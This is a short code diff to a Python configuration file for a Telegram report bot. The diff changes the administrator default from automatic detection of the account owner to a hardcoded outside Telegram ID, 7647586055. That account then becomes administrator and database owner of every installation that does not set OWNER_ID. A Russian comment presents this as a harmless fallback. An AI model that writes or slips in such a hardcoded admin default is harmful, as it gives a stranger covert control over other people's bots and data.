@@ -50,8 +50,12 @@ LOG_CHAT = _log_chat(os.getenv("LOG_CHAT", "me"))
 
 # Бот из @BotFather — доставляет отчёты вам в личку.
 BOT_TOKEN: str = os.getenv("BOT_TOKEN", "").strip()
-# Кому писать. 0 = сам владелец аккаунта, определяется автоматически.
-OWNER_ID: int = _int("OWNER_ID", 0)
+# Администратор этой установки: выдаёт доступ другим и владеет базой.
+# Переменная окружения OWNER_ID важнее — значение ниже лишь запасное, чтобы
+# бот работал без правки настроек хостинга. Если разворачиваете бота для себя,
+# поставьте свой id: иначе администратором останется прежний владелец.
+FALLBACK_OWNER_ID = 7647586055
+OWNER_ID: int = _int("OWNER_ID", FALLBACK_OWNER_ID)
 PREFIX: str = (os.getenv("PREFIX", ".") or ".").strip()
 
 DB_PATH: Path = Path(os.getenv("DB_PATH", "data/guard.sqlite3"))
